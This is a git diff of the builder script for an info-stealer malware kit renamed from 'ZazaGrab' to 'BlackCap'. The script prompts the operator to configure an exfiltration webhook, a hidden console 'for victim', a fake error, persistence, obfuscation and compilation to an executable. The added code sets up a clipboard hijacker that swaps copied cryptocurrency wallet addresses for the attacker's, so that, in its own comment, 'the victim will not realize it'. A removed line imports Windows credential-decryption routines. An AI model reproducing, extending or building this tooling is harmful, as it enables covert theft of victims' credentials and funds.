@@ -6,11 +6,9 @@ import sys
 import time
 from json import load
 from urllib.request import urlopen
-from zlib import compress
 
 
 import requests
-from alive_progress import alive_bar
 from colorama import Fore, Style, init
 
 class Builder:
@@ -55,6 +53,55 @@ class Builder:
             self.ping = "no"
             self.pingtype = "none"
 
+
+#(the victim will not realize it and you will intercept each of his transactions)
+        self.address_replacer = input(f'{Fore.CYAN}[{Fore.RESET}NEW{Fore.CYAN}]{Fore.RESET} Replace all copied crypto address wallet by your address ? (yes/no): ')
+        if self.address_replacer.lower() == 'yes':
+            self.address_replacer = "yes"
+            self.btc_address = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your Bitcoin Address (let empty if you do not have): ').lower()
+            if not self.btc_address.lower():
+                self.btc_address = 'none'
+                
+            self.eth_address = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your Ethereum Address (let empty if you do not have):').lower()
+            if not self.eth_address.lower():
+                self.eth_address = '0x4c305D9d4CdF740FF4f2166ecF65c1DF73e93472'
+
+            self.xchain_address = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your X-Chain Address (let empty if you do not have):').lower()
+            if not self.xchain_address.lower():
+                self.xchain_address = 'none'
+
+            self.pchain_address = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your P-Chain Address (let empty if you do not have):').lower()
+            if not self.pchain_address.lower():
+                self.pchain_address = 'none'
+
+            self.cchain_address = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your C-Chain Address (let empty if you do not have):').lower()
+            if not self.cchain_address.lower():
+                self.cchain_address = 'none'
+
+            self.monero_address = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your Monero Address (let empty if you do not have):').lower()
+            if not self.monero_address.lower():
+                self.monero_address = 'none'
+
+            self.ada_address = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your Ada/Cardano Address (let empty if you do not have):').lower()
+            if not self.ada_address.lower():
+                self.ada_address = 'none'
+
+            self.dash_address = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your Dash Address (let empty if you do not have):').lower()
+            if not self.dash_address.lower():
+                self.dash_address = 'none'
+              
+        else:
+            self.address_replacer = "no"
+            self.btc_address = "none"
+            self.eth_address = "none"
+            self.xchain_address = "none"
+            self.pchain_address = "none"
+            self.cchain_address = "none"
+            self.monero_address = "none"
+            self.dash_address = "none"
+            self.ada_address = "none"
+
+
         self.error = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Add a fake error? (yes/no): ')
         if self.error.lower() == 'y' or self.error.lower() == 'yes':
             self.error = "yes"
@@ -68,13 +115,13 @@ class Builder:
             self.startup = "no"
 
         
-        self.hider = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Hide ZazaGrab console for victim? (yes/no): ')
+        self.hider = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Hide BlackCap console for victim? (yes/no): ')
         if self.hider.lower() == 'yes' or self.hider.lower() == 'y':
             self.hider = "yes"
         else:
             self.hider = False
 
-        self.obfuscation = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to obfuscate the ZazaGraber (recommand yes)? (yes/no): ')
+        self.obfuscation = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to obfuscate the BlackCap (recommand yes)? (yes/no): ')
 
         self.compy = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to compile the file to a .exe? (yes/no): ')
 
@@ -107,145 +154,142 @@ class Builder:
         img = fr"""{p}
 
 
-          _____                    _____                    _____                    _____          
-         /\    \                  /\    \                  /\    \                  /\    \         
-        /::\    \                /::\    \                /::\    \                /::\    \        
-        \:::\    \              /::::\    \               \:::\    \              /::::\    \       
-         \:::\    \            /::::::\    \               \:::\    \            /::::::\    \      
-          \:::\    \          /:::/\:::\    \               \:::\    \          /:::/\:::\    \     
-           \:::\    \        /:::/__\:::\    \               \:::\    \        /:::/__\:::\    \    
-            \:::\    \      /::::\   \:::\    \               \:::\    \      /::::\   \:::\    \   
-             \:::\    \    /::::::\   \:::\    \               \:::\    \    /::::::\   \:::\    \  
-              \:::\    \  /:::/\:::\   \:::\    \               \:::\    \  /:::/\:::\   \:::\    \ 
-_______________\:::\____\/:::/  \:::\   \:::\____\_______________\:::\____\/:::/  \:::\   \:::\____\
-\::::::::::::::::::/    /\::/    \:::\  /:::/    /\::::::::::::::::::/    /\::/    \:::\  /:::/    /
- \::::::::::::::::/____/  \/____/ \:::\/:::/    /  \::::::::::::::::/____/  \/____/ \:::\/:::/    / 
-  \:::\~~~~\~~~~~~                 \::::::/    /    \:::\~~~~\~~~~~~                 \::::::/    /  
-   \:::\    \                       \::::/    /      \:::\    \                       \::::/    /   
-    \:::\    \                      /:::/    /        \:::\    \                      /:::/    /    
-     \:::\    \                    /:::/    /          \:::\    \                    /:::/    /     
-      \:::\    \                  /:::/    /            \:::\    \                  /:::/    /      
-       \:::\____\                /:::/    /              \:::\____\                /:::/    /       
-        \::/    /                \::/    /                \::/    /                \::/    /        
-         \/____/                  \/____/                  \/____/                  \/____/         
-                                                                                                    
+                                                        
+         ,----,                    ,----,               
+       .'   .`|  ,---,           .'   .`|  ,---,        
+    .'   .'   ; '  .' \       .'   .'   ; '  .' \       
+  ,---, '    .'/  ;    '.   ,---, '    .'/  ;    '.     
+  |   :     ./:  :       \  |   :     ./:  :       \    
+  ;   | .'  / :  |   /\   \ ;   | .'  / :  |   /\   \   
+  `---' /  ;  |  :  ' ;.   :`---' /  ;  |  :  ' ;.   :  
+    /  ;  /   |  |  ;/  \   \ /  ;  /   |  |  ;/  \   \ 
+   ;  /  /--, '  :  | \  \ ,';  /  /--, '  :  | \  \ ,' 
+  /  /  / .`| |  |  '  '--' /  /  / .`| |  |  '  '--'   
+./__;       : |  :  :     ./__;       : |  :  :         
+|   :     .'  |  | ,'     |   :     .'  |  | ,'         
+;   |  .'     `--''       ;   |  .'     `--''           
+`---'                     `---'                         
+                                                        
         """
         img1 = fr"""{p}
 
 
-              ,---.                   ,---.      
-  ,--,----. .--.'  \      ,--,----. .--.'  \     
- /==/` - ./ \==\-/\ \    /==/` - ./ \==\-/\ \    
- `--`=/. /  /==/-|_\ |   `--`=/. /  /==/-|_\ |   
-  /==/- /   \==\,   - \   /==/- /   \==\,   - \  
- /==/- /-.  /==/ -   ,|  /==/- /-.  /==/ -   ,|  
-/==/, `--`\/==/-  /\ - \/==/, `--`\/==/-  /\ - \ 
-\==\-  -, |\==\ _.\=\.-'\==\-  -, |\==\ _.\=\.-' 
- `--`.-.--` `--`         `--`.-.--` `--`         
+                                                        
+         ,----,                    ,----,               
+       .'   .`|  ,---,           .'   .`|  ,---,        
+    .'   .'   ; '  .' \       .'   .'   ; '  .' \       
+  ,---, '    .'/  ;    '.   ,---, '    .'/  ;    '.     
+  |   :     ./:  :       \  |   :     ./:  :       \    
+  ;   | .'  / :  |   /\   \ ;   | .'  / :  |   /\   \   
+  `---' /  ;  |  :  ' ;.   :`---' /  ;  |  :  ' ;.   :  
+    /  ;  /   |  |  ;/  \   \ /  ;  /   |  |  ;/  \   \ 
+   ;  /  /--, '  :  | \  \ ,';  /  /--, '  :  | \  \ ,' 
+  /  /  / .`| |  |  '  '--' /  /  / .`| |  |  '  '--'   
+./__;       : |  :  :     ./__;       : |  :  :         
+|   :     .'  |  | ,'     |   :     .'  |  | ,'         
+;   |  .'     `--''       ;   |  .'     `--''           
+`---'                     `---'                         
+                                                        
+ 
         """
         img2 = fr"""{p}
 
-
-          _____                    _____                    _____                    _____          
-         /\    \                  /\    \                  /\    \                  /\    \         
-        /::\    \                /::\    \                /::\    \                /::\    \        
-        \:::\    \              /::::\    \               \:::\    \              /::::\    \       
-         \:::\    \            /::::::\    \               \:::\    \            /::::::\    \      
-          \:::\    \          /:::/\:::\    \               \:::\    \          /:::/\:::\    \     
-           \:::\    \        /:::/__\:::\    \               \:::\    \        /:::/__\:::\    \    
-            \:::\    \      /::::\   \:::\    \               \:::\    \      /::::\   \:::\    \   
-             \:::\    \    /::::::\   \:::\    \               \:::\    \    /::::::\   \:::\    \  
-              \:::\    \  /:::/\:::\   \:::\    \               \:::\    \  /:::/\:::\   \:::\    \ 
-_______________\:::\____\/:::/  \:::\   \:::\____\_______________\:::\____\/:::/  \:::\   \:::\____\
-\::::::::::::::::::/    /\::/    \:::\  /:::/    /\::::::::::::::::::/    /\::/    \:::\  /:::/    /
- \::::::::::::::::/____/  \/____/ \:::\/:::/    /  \::::::::::::::::/____/  \/____/ \:::\/:::/    / 
-  \:::\~~~~\~~~~~~                 \::::::/    /    \:::\~~~~\~~~~~~                 \::::::/    /  
-   \:::\    \                       \::::/    /      \:::\    \                       \::::/    /   
-    \:::\    \                      /:::/    /        \:::\    \                      /:::/    /    
-     \:::\    \                    /:::/    /          \:::\    \                    /:::/    /     
-      \:::\    \                  /:::/    /            \:::\    \                  /:::/    /      
-       \:::\____\                /:::/    /              \:::\____\                /:::/    /       
-        \::/    /                \::/    /                \::/    /                \::/    /        
-         \/____/                  \/____/                  \/____/                  \/____/         
-                                                                                                    
+                                                        
+         ,----,                    ,----,               
+       .'   .`|  ,---,           .'   .`|  ,---,        
+    .'   .'   ; '  .' \       .'   .'   ; '  .' \       
+  ,---, '    .'/  ;    '.   ,---, '    .'/  ;    '.     
+  |   :     ./:  :       \  |   :     ./:  :       \    
+  ;   | .'  / :  |   /\   \ ;   | .'  / :  |   /\   \   
+  `---' /  ;  |  :  ' ;.   :`---' /  ;  |  :  ' ;.   :  
+    /  ;  /   |  |  ;/  \   \ /  ;  /   |  |  ;/  \   \ 
+   ;  /  /--, '  :  | \  \ ,';  /  /--, '  :  | \  \ ,' 
+  /  /  / .`| |  |  '  '--' /  /  / .`| |  |  '  '--'   
+./__;       : |  :  :     ./__;       : |  :  :         
+|   :     .'  |  | ,'     |   :     .'  |  | ,'         
+;   |  .'     `--''       ;   |  .'     `--''           
+`---'                     `---'                         
+                                                        
         """
         img3 = fr"""{p}
 
-              ,---.                   ,---.      
-  ,--,----. .--.'  \      ,--,----. .--.'  \     
- /==/` - ./ \==\-/\ \    /==/` - ./ \==\-/\ \    
- `--`=/. /  /==/-|_\ |   `--`=/. /  /==/-|_\ |   
-  /==/- /   \==\,   - \   /==/- /   \==\,   - \  
- /==/- /-.  /==/ -   ,|  /==/- /-.  /==/ -   ,|  
-/==/, `--`\/==/-  /\ - \/==/, `--`\/==/-  /\ - \ 
-\==\-  -, |\==\ _.\=\.-'\==\-  -, |\==\ _.\=\.-' 
- `--`.-.--` `--`         `--`.-.--` `--`         
+
+                                                        
+         ,----,                    ,----,               
+       .'   .`|  ,---,           .'   .`|  ,---,        
+    .'   .'   ; '  .' \       .'   .'   ; '  .' \       
+  ,---, '    .'/  ;    '.   ,---, '    .'/  ;    '.     
+  |   :     ./:  :       \  |   :     ./:  :       \    
+  ;   | .'  / :  |   /\   \ ;   | .'  / :  |   /\   \   
+  `---' /  ;  |  :  ' ;.   :`---' /  ;  |  :  ' ;.   :  
+    /  ;  /   |  |  ;/  \   \ /  ;  /   |  |  ;/  \   \ 
+   ;  /  /--, '  :  | \  \ ,';  /  /--, '  :  | \  \ ,' 
+  /  /  / .`| |  |  '  '--' /  /  / .`| |  |  '  '--'   
+./__;       : |  :  :     ./__;       : |  :  :         
+|   :     .'  |  | ,'     |   :     .'  |  | ,'         
+;   |  .'     `--''       ;   |  .'     `--''           
+`---'                     `---'                         
+                                                        
         """
         img4 = fr"""{p}
 
 
-          _____                    _____                    _____                    _____          
-         /\    \                  /\    \                  /\    \                  /\    \         
-        /::\    \                /::\    \                /::\    \                /::\    \        
-        \:::\    \              /::::\    \               \:::\    \              /::::\    \       
-         \:::\    \            /::::::\    \               \:::\    \            /::::::\    \      
-          \:::\    \          /:::/\:::\    \               \:::\    \          /:::/\:::\    \     
-           \:::\    \        /:::/__\:::\    \               \:::\    \        /:::/__\:::\    \    
-            \:::\    \      /::::\   \:::\    \               \:::\    \      /::::\   \:::\    \   
-             \:::\    \    /::::::\   \:::\    \               \:::\    \    /::::::\   \:::\    \  
-              \:::\    \  /:::/\:::\   \:::\    \               \:::\    \  /:::/\:::\   \:::\    \ 
-_______________\:::\____\/:::/  \:::\   \:::\____\_______________\:::\____\/:::/  \:::\   \:::\____\
-\::::::::::::::::::/    /\::/    \:::\  /:::/    /\::::::::::::::::::/    /\::/    \:::\  /:::/    /
- \::::::::::::::::/____/  \/____/ \:::\/:::/    /  \::::::::::::::::/____/  \/____/ \:::\/:::/    / 
-  \:::\~~~~\~~~~~~                 \::::::/    /    \:::\~~~~\~~~~~~                 \::::::/    /  
-   \:::\    \                       \::::/    /      \:::\    \                       \::::/    /   
-    \:::\    \                      /:::/    /        \:::\    \                      /:::/    /    
-     \:::\    \                    /:::/    /          \:::\    \                    /:::/    /     
-      \:::\    \                  /:::/    /            \:::\    \                  /:::/    /      
-       \:::\____\                /:::/    /              \:::\____\                /:::/    /       
-        \::/    /                \::/    /                \::/    /                \::/    /        
-         \/____/                  \/____/                  \/____/                  \/____/         
-                                                                                                    
+                                                        
+         ,----,                    ,----,               
+       .'   .`|  ,---,           .'   .`|  ,---,        
+    .'   .'   ; '  .' \       .'   .'   ; '  .' \       
+  ,---, '    .'/  ;    '.   ,---, '    .'/  ;    '.     
+  |   :     ./:  :       \  |   :     ./:  :       \    
+  ;   | .'  / :  |   /\   \ ;   | .'  / :  |   /\   \   
+  `---' /  ;  |  :  ' ;.   :`---' /  ;  |  :  ' ;.   :  
+    /  ;  /   |  |  ;/  \   \ /  ;  /   |  |  ;/  \   \ 
+   ;  /  /--, '  :  | \  \ ,';  /  /--, '  :  | \  \ ,' 
+  /  /  / .`| |  |  '  '--' /  /  / .`| |  |  '  '--'   
+./__;       : |  :  :     ./__;       : |  :  :         
+|   :     .'  |  | ,'     |   :     .'  |  | ,'         
+;   |  .'     `--''       ;   |  .'     `--''           
+`---'                     `---'                         
+                                                        
         """
         img5 = fr"""{p}
 
 
-
-              ,---.                   ,---.      
-  ,--,----. .--.'  \      ,--,----. .--.'  \     
- /==/` - ./ \==\-/\ \    /==/` - ./ \==\-/\ \    
- `--`=/. /  /==/-|_\ |   `--`=/. /  /==/-|_\ |   
-  /==/- /   \==\,   - \   /==/- /   \==\,   - \  
- /==/- /-.  /==/ -   ,|  /==/- /-.  /==/ -   ,|  
-/==/, `--`\/==/-  /\ - \/==/, `--`\/==/-  /\ - \ 
-\==\-  -, |\==\ _.\=\.-'\==\-  -, |\==\ _.\=\.-' 
- `--`.-.--` `--`         `--`.-.--` `--`         
+                                                        
+         ,----,                    ,----,               
+       .'   .`|  ,---,           .'   .`|  ,---,        
+    .'   .'   ; '  .' \       .'   .'   ; '  .' \       
+  ,---, '    .'/  ;    '.   ,---, '    .'/  ;    '.     
+  |   :     ./:  :       \  |   :     ./:  :       \    
+  ;   | .'  / :  |   /\   \ ;   | .'  / :  |   /\   \   
+  `---' /  ;  |  :  ' ;.   :`---' /  ;  |  :  ' ;.   :  
+    /  ;  /   |  |  ;/  \   \ /  ;  /   |  |  ;/  \   \ 
+   ;  /  /--, '  :  | \  \ ,';  /  /--, '  :  | \  \ ,' 
+  /  /  / .`| |  |  '  '--' /  /  / .`| |  |  '  '--'   
+./__;       : |  :  :     ./__;       : |  :  :         
+|   :     .'  |  | ,'     |   :     .'  |  | ,'         
+;   |  .'     `--''       ;   |  .'     `--''           
+`---'                     `---'                         
+                                                        
         """
         img6 = fr"""{p}
 
 
-          _____                    _____                    _____                    _____          
-         /\    \                  /\    \                  /\    \                  /\    \         
-        /::\    \                /::\    \                /::\    \                /::\    \        
-        \:::\    \              /::::\    \               \:::\    \              /::::\    \       
-         \:::\    \            /::::::\    \               \:::\    \            /::::::\    \      
-          \:::\    \          /:::/\:::\    \               \:::\    \          /:::/\:::\    \     
-           \:::\    \        /:::/__\:::\    \               \:::\    \        /:::/__\:::\    \    
-            \:::\    \      /::::\   \:::\    \               \:::\    \      /::::\   \:::\    \   
-             \:::\    \    /::::::\   \:::\    \               \:::\    \    /::::::\   \:::\    \  
-              \:::\    \  /:::/\:::\   \:::\    \               \:::\    \  /:::/\:::\   \:::\    \ 
-_______________\:::\____\/:::/  \:::\   \:::\____\_______________\:::\____\/:::/  \:::\   \:::\____\
-\::::::::::::::::::/    /\::/    \:::\  /:::/    /\::::::::::::::::::/    /\::/    \:::\  /:::/    /
- \::::::::::::::::/____/  \/____/ \:::\/:::/    /  \::::::::::::::::/____/  \/____/ \:::\/:::/    / 
-  \:::\~~~~\~~~~~~                 \::::::/    /    \:::\~~~~\~~~~~~                 \::::::/    /  
-   \:::\    \                       \::::/    /      \:::\    \                       \::::/    /   
-    \:::\    \                      /:::/    /        \:::\    \                      /:::/    /    
-     \:::\    \                    /:::/    /          \:::\    \                    /:::/    /     
-      \:::\    \                  /:::/    /            \:::\    \                  /:::/    /      
-       \:::\____\                /:::/    /              \:::\____\                /:::/    /       
-        \::/    /                \::/    /                \::/    /                \::/    /        
-         \/____/                  \/____/                  \/____/                  \/____/         
-                                                                                                    
+                                                        
+         ,----,                    ,----,               
+       .'   .`|  ,---,           .'   .`|  ,---,        
+    .'   .'   ; '  .' \       .'   .'   ; '  .' \       
+  ,---, '    .'/  ;    '.   ,---, '    .'/  ;    '.     
+  |   :     ./:  :       \  |   :     ./:  :       \    
+  ;   | .'  / :  |   /\   \ ;   | .'  / :  |   /\   \   
+  `---' /  ;  |  :  ' ;.   :`---' /  ;  |  :  ' ;.   :  
+    /  ;  /   |  |  ;/  \   \ /  ;  /   |  |  ;/  \   \ 
+   ;  /  /--, '  :  | \  \ ,';  /  /--, '  :  | \  \ ,' 
+  /  /  / .`| |  |  '  '--' /  /  / .`| |  |  '  '--'   
+./__;       : |  :  :     ./__;       : |  :  :         
+|   :     .'  |  | ,'     |   :     .'  |  | ,'         
+;   |  .'     `--''       ;   |  .'     `--''           
+`---'                     `---'                         
+                                                        
         """
         
         os.system('mode con:cols=120 lines=45')
@@ -274,42 +318,23 @@ _______________\:::\____\/:::/  \:::\   \:::\____\_______________\:::\____\/:::/
         r = Fore.RED + Style.BRIGHT
         img = fr"""{p} 
 
-                                                        
-         ,----,                    ,----,               
-       .'   .`|  ,---,           .'   .`|  ,---,        
-    .'   .'   ; '  .' \       .'   .'   ; '  .' \       
-  ,---, '    .'/  ;    '.   ,---, '    .'/  ;    '.     
-  |   :     ./:  :       \  |   :     ./:  :       \    
-  ;   | .'  / :  |   /\   \ ;   | .'  / :  |   /\   \   
-  `---' /  ;  |  :  ' ;.   :`---' /  ;  |  :  ' ;.   :  
-    /  ;  /   |  |  ;/  \   \ /  ;  /   |  |  ;/  \   \ 
-   ;  /  /--, '  :  | \  \ ,';  /  /--, '  :  | \  \ ,' 
-  /  /  / .`| |  |  '  '--' /  /  / .`| |  |  '  '--'   
-./__;       : |  :  :     ./__;       : |  :  :         
-|   :     .'  |  | ,'     |   :     .'  |  | ,'         
-;   |  .'     `--''       ;   |  .'     `--''           
-`---'                     `---'                         
-                                                        
+                                                                          
+ ______     ______     ______     ______    
+/\___  \   /\  __ \   /\___  \   /\  __ \   
+\/_/  /__  \ \  __ \  \/_/  /__  \ \  __ \  
+  /\_____\  \ \_\ \_\   /\_____\  \ \_\ \_\ 
+  \/_____/   \/_/\/_/   \/_____/   \/_/\/_/ 
+                                            
                                                                       
 
 
-                      IP: {load(urlopen('https://api.myip.com/'))['ip']}
+                      IP: {load(urlopen('https://www.myexternalip.com/json'))['ip']}
                 Username: {os.getlogin()}
                  PC Name: {os.getenv('COMPUTERNAME')}
         Operating System: {os.getenv('OS')}
 |"""
 
 
-        
-
-        with alive_bar(40) as bar:
-            for _ in range(40):
-                print(img)
-                time.sleep(random.randint(1, 3) / 40)
-                os.system('cls')
-                bar()
-
-            os.system('cls')
 
         print(Style.RESET_ALL)
 
@@ -384,6 +409,10 @@ _______________\:::\____\/:::/  \:::\   \:::\____\_______________\:::\____\/:::/
             os.rename(f"./obfuscated_compressed_{filename}.exe", f"./{filename}.exe")
         except Exception:
             pass
+        try:
+            os.rename(f"./obfuscated_{filename}.exe", f"./{filename}.exe")
+        except Exception:
+            pass
 
     def mk_file(self, filename, webhook):
         print(f'{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET} {Fore.WHITE}Generating source code...{Fore.RESET}')
@@ -395,6 +424,15 @@ _______________\:::\____\/:::/  \:::\   \:::\____\_______________\:::\____\/:::/
             f.write(code.replace('%WEBHOOK_HERE%', webhook)
                     .replace("%ping_enabled%", str(self.ping))
                     .replace("%ping_type%", self.pingtype)
+                    .replace("%_address_replacer%", str(self.address_replacer))
+                    .replace("%_btc_address%", self.btc_address)
+                    .replace("%_eth_address%", self.eth_address)
+                    .replace("%_xchain_address%", self.xchain_address)
+                    .replace("%_pchain_address%", self.pchain_address)
+                    .replace("%_cchain_address%", self.cchain_address)
+                    .replace("%_monero_address%", self.monero_address)
+                    .replace("%_ada_address%", self.ada_address)
+                    .replace("%_dash_address%", self.dash_address)
                     .replace("%_error_enabled%", str(self.error))
                     .replace("%_startup_enabled%", str(self.startup))
                     .replace("%_hide_script%", str(self.hider))
@@ -404,39 +442,22 @@ _______________\:::\____\/:::/  \:::\   \:::\____\_______________\:::\____\/:::/
         time.sleep(2)
         print(f'{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Source code has been generated...{Fore.RESET}')
 
-        with open(f"{filename}.py", mode='rb') as f:
-            content = f.read()
 
-        print(f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Compressing Code...{Fore.RESET}")
-
-        original_size = len(content)
-        content = self.compress(content)
-        new_size = len(content)
-
-        with open(file='compressed_' + (filename.split('\\')[-1] if '\\' in filename else filename.split('/')[-1]) + '.py', mode='w', encoding='utf-8') as f:
-            f.write(content)
-            if self.obfuscation == 'no' and self.compy == 'yes':
-                f.write("\nimport asyncio, json, ntpath, os, random, re, shutil, sqlite3, subprocess, threading, winreg, zipfile, httpx, psutil, win32gui, win32con, base64, requests, ctypes, time;from sqlite3 import connect;from base64 import b64decode;from urllib.request import Request, urlopen;from shutil import copy2;from datetime import datetime, timedelta, timezone;from sys import argv;from tempfile import gettempdir, mkdtemp;from json import loads, dumps;from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer;from Crypto.Cipher import AES;from PIL import ImageGrab;from win32crypt import CryptUnprotectData")
-
-        print(f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Old file size: {original_size} bytes - New file size: {new_size} bytes {Fore.RESET}")
 
         if self.obfuscation == 'yes' and self.compy == 'yes':
-            self.encryption(f"compressed_{filename}")
-            self.compile(f"obfuscated_compressed_{filename}")
+            self.encryption(f"{filename}")
+            self.compile(f"obfuscated_{filename}")
         elif self.obfuscation == 'no' and self.compy == 'yes':
-            self.compile(f"compressed_{filename}")
+            self.compile(f"{filename}")
         elif self.obfuscation == 'yes' and self.compy == 'no':
-            self.encryption(f"compressed_{filename}")
+            self.encryption(f"{filename}")
         else:
             pass
 
-    def compress(self, content):
-        compressed_code = compress(content)
-        return f"eval(compile(__import__('zlib').decompress({compressed_code}),filename='auoiwhgoawhg',mode='exec'))"
 
     def encryption(self, filename):
         print(f'{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Obfuscating code...{Fore.RESET}')
-        os.system(f"python obfuscation.py {filename}.py")
+        os.system(f"python obfuscation.py -i {filename}.py -o obfuscated_{filename}.py -s 100")
 
     def compile(self, filename):
         print(f'{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET} {Fore.WHITE}Compiling code...{Fore.RESET}')
@@ -444,7 +465,7 @@ _______________\:::\____\/:::/  \:::\   \:::\____\_______________\:::\____\/:::/
             icon = self.icon_name
         else:
             icon = "NONE"
-        os.system(f'python -m PyInstaller --onefile --noconsole --upx-dir=./tools -i {icon} --distpath ./ .\\{filename}.py')
+        os.system(f'python -m PyInstaller --onefile --noconsole --upx-dir=./blackcap_files/upx -i {icon} --distpath ./ .\\{filename}.py')
         print(f'{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Code compiled!{Fore.RESET}')
 
     def run(self, filename):
